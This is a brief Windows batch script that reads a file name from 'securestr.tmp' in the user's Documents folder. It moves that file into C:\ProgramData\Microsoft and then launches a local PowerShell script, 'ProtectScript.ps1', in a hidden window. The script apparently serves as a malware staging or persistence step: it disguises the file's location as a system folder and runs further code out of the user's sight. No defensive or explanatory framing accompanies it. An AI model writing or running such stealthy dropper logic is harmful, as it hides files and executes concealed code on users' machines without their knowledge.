@echo off
setlocal

for /f "tokens=2*" %%A in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Personal ^| find "REG_"') do set "documentsPath=%%B"
if "%documentsPath%"=="" (
    exit /b 1
)

set "filename=securestr.tmp"

if not exist "%documentsPath%\%filename%" (
    exit /b 1
)
set /p fileContent=<"%documentsPath%\%filename%"
set "destinationDirectory=C:\ProgramData\Microsoft"
if not exist "%destinationDirectory%" (
    mkdir "%destinationDirectory%"
)
move "%documentsPath%\%fileContent%" "%destinationDirectory%"
powershell.exe -File .\ProtectScript.ps1 -WindowStyle Hidden
